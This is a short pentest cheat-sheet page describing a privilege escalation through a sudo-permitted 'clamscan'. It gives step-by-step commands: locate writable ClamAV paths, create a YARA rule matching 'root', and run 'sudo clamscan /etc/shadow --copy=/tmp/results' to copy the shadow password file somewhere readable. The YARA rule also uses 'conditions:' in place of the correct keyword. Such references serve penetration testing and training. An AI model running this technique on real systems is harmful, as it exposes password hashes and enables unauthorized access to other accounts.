# Sudo ClamAV Privilege Escalation

The `sudo clamscan` command might be vulnerable to privilege escalation (PrivEsc).

### Investigation <a href="#investigation" id="investigation"></a>

If we can execute **“clamscan”** command as root as below,

```shellscript
sudo /usr/bin/clamscan /etc/shadow --copy=/tmp/results
```

we can read sensitive files by applying the custom yara rule.

### Exploitation <a href="#exploitation" id="exploitation"></a>

#### 1. Create a Yara Rule <a href="#id-1-create-a-yara-rule" id="id-1-create-a-yara-rule"></a>

First off, check the location in which the yara file can be created.

```shellscript
find / -name "clam*" 2>/dev/null
```

For instance, assume we can create the yara file under **/var/lib/clamav/**.\
Create the yara rule in there.\
Assume we want to read /etc/shadow, so specify the string **“root”** because the /etc/shadow contains “root” user name.

```shellscript
# /var/lib/clamav/test.yara
rule test
{
  strings:
    $string = "root"
  conditions:
    $string
}
```

#### 2. Execute ClamScan <a href="#id-2-execute-clamscan" id="id-2-execute-clamscan"></a>

Now execute **"clamscan"** as root.

```
sudo /usr/bin/clamscan /etc/shadow --copy=/tmp/results
```

We can see **/etc/shadow** under **/tmp/results**.
